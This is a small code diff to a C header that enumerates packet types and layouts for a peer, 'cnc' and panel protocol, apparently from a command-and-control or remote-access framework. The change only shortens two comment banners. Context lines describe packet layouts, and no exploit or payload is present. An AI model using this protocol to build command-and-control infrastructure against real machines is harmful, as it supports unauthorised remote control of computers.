@@ -34,7 +34,7 @@
     if packet doesn't have either, it can be sent & received by both peer & cnc
 */
 enum {
-/* ==================================================[[ Peer ]]================================================== */
+/* =========================================[[ Peer ]]========================================== */
     LAIKAPKT_VARPKT,
     /* layout of LAIKAPKT_VARPKT:
     *   LAIKAPKT_SIZE pktSize;
@@ -73,7 +73,7 @@ enum {
     *   uint32_t id;
     *   char buf[VAR_PACKET_LENGTH-sizeof(uint32_t)];
     */
-/* ==================================================[[ Auth ]]================================================== */
+/* =========================================[[ Auth ]]========================================== */
     LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel). there is no response packet */
     /* layout of LAIKAPKT_STAGE2_HANDSHAKE_REQ
     *   uint8_t peerType;
